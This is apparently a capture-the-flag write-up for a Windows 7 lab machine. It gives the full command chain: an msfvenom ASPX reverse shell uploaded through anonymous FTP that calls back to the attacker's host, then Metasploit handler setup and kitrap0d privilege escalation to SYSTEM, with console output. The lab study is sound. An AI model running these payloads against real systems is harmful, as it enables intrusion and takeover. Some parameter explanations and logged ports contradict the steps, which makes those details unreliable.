User FLAG
-----

1. Port scan
2. FTP + IIS 7.5
3. FTP anonymous login
4. Find that we can upload files
5. Use msfvenom to create a reverse shell
6. `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=4444 -f aspx > devel.aspx`

- where `LHOST` is the IP of the attacker machine
- where `LPORT` is the port to listen on the attacker machine

7. ftp upload devel.aspx
8. msfconsole
9. use exploit/multi/handler
10. set payload windows/meterpreter/reverse_tcp
11. set LHOST 10.10.10.5
12. set LPORT 4444

- where `LHOST` is the IP of the target machine
- where `LPORT` is the same port as the one used in the msfvenom command

13. set ExitOnSession false
14. exploit -j


```bash
curl http://10.10.10.5/devel.aspx
```

```bash
[-] Handler failed to bind to 10.10.10.5:3333:-  -
[-] Handler failed to bind to 0.0.0.0:3333:-  -
[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:3333).
[*] Sending stage (176198 bytes) to 10.10.10.5
[*] Meterpreter session 3 opened (10.10.14.9:3333 -> 10.10.10.5:49181) at 2024-03-27 00:15:57 -0300
```

```bash
sessions -i 3
meterpreter > getuid
Server username: IIS APPPOOL\Web
meterpreter > cd \windows\TEMP
meterpreter > sysinfo
msf6 exploit(multi/handler) > sessions -i 3
meterpreter > sysinfo
Computer        : DEVEL
OS              : Windows 7 (6.1 Build 7600).
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > 
```

```bash
meterpreter > run post/multi/recon/local_exploit_suggester                                                                                                                                                                          
[*] 10.10.10.5 - Collecting local exploits for x86/windows...                                                                                                                       
[*] 10.10.10.5 - 193 exploit checks are being tried...                                                                                                                              
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.                                                                                     
[+] 10.10.10.5 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build
 detected!                                                                                                                                                                          
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.                                                                       
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.                                                                    
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.                                                                                   
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.                                                                              
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.                                                                              
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.                                                                      
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.                                                                             
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.                                                                         
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] 10.10.10.5 - Valid modules for session 3: 
```

```bash
background
msf6 exploit(multi/handler) > use exploit/windows/local/ms10_015_kitrap0d
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms10_015_kitrap0d) > options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.9 (MY_VPN_IP)      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/ms10_015_kitrap0d) > 
```

```bash
msf6 exploit(windows/local/ms10_015_kitrap0d) > sessions ls

Active sessions
===============

  Id  Name  Type                     Information                  Connection
  --  ----  ----                     -----------                  ----------
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ DEVEL  10.10.14.9:4444 -> 10.10.10.5:49180 (10.10.10.5)
  3         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL      10.10.14.9:3333 -> 10.10.10.5:49181 (10.10.10.5)

msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 3
SESSION => 3
msf6 exploit(windows/local/ms10_015_kitrap0d) > run

[-] Handler failed to bind to 10.10.14.9:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[*] Reflectively injecting payload and triggering the bug...
[*] Launching netsh to host the DLL...
[+] Process 3124 launched.
[*] Reflectively injecting the DLL into 3124...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176198 bytes) to 10.10.10.5
[*] Meterpreter session 4 opened (10.10.14.9:4444 -> 10.10.10.5:49182) at 2024-03-27 00:31:43 -0300
[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/ms10_015_kitrap0d) > sessions -i 4
[*] Starting interaction with 4...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```

## Versions

FTP
IIS 7.5

## Links

- https://debugah.com/problems-of-entering-extended-passive-mode-encountered-in-ftp-how-to-solve-15292/
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services
- https://github.com/rapid7/metasploit-framework/issues/16007
- https://www.rapid7.com/blog/post/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/